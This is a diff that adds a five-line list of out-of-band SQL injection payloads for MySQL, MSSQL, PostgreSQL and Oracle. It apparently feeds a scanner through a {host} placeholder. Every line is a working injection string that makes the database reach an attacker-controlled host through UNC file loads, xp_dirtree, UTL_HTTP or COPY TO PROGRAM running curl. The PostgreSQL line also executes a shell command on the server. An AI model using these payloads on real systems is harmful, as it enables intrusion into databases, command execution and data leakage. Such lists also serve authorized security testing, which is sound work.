@@ -1,0 +1,5 @@
+' UNION SELECT LOAD_FILE(CONCAT('\\\\{host}\\a'))--
+'; DECLARE @q varchar(200); SET @q='\\{host}\a'; EXEC master.dbo.xp_dirtree @q--
+COPY (SELECT '') TO PROGRAM 'curl http://{host}/oob'--
+'; SELECT UTL_HTTP.REQUEST('http://{host}/oob') FROM dual--
+' AND LOAD_FILE('\\\\{host}\\a')--
